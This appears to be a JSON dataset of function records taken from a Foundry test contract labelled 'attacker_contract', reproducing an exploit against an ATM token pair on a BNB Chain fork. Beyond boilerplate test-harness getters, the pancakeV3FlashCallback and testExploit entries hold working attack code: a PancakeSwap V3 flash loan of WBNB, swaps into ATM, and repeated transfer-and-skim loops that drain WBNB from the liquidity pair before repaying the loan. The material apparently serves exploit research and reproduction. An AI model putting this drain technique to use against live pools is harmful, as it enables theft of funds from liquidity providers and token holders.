[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {\n        console.log(WBNB.balanceOf(address(this)));\n        uint256 i = 0;\n        uint256 j = 0;\n        swap_token_to_token(address(WBNB), address(USDT), WBNB.balanceOf(address(this)) - 170 ether);\n        while (j < 2) {\n            swap_token_to_token(address(WBNB), address(ATM), 70 ether);\n            while (i < 100) {\n                uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm));\n                ATM.transfer(address(wbnb_atm), ATM.balanceOf(address(this)));\n                wbnb_atm.skim(address(this));\n                (, uint256 wbnb_r,) = wbnb_atm.getReserves();\n                uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;\n                console.log(\"Pair lost:\", pair_lost);\n                if (pair_lost == 7) {\n                    break;\n                }\n                i++;\n            }\n            j++;\n        }\n        // To get max profit,not good at math so just copy the exploiter's work\n        i = 0;\n        while (i < 15) {\n            uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm));\n            ATM.transfer(address(wbnb_atm), ATM.balanceOf(address(this)));\n            wbnb_atm.skim(address(this));\n            (, uint256 wbnb_r,) = wbnb_atm.getReserves();\n            uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;\n            console.log(\"Pair lost:\", pair_lost, \"BNB\");\n            if (pair_lost == 0) {\n                break;\n            }\n            i++;\n        }\n        swap_token_to_token(address(ATM), address(WBNB), ATM.balanceOf(address(this)));\n        swap_token_to_token(address(USDT), address(WBNB), USDT.balanceOf(address(this)));\n        console.log(\"My wbnb\", WBNB.balanceOf(address(this)));\n        WBNB.transfer(address(pool), borrow_amount * 10_000 / 9975 + 1000);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 37_483_300);\n        deal(address(USDT), address(this), 0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker USDT before exploit\", WBNB.balanceOf(address(this)), 18);\n        borrow_amount = WBNB.balanceOf(address(pool)) - 1e18;\n        pool.flash(address(this), 0, borrow_amount, \"\");\n        emit log_named_decimal_uint(\"[End] Attacker USDT after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]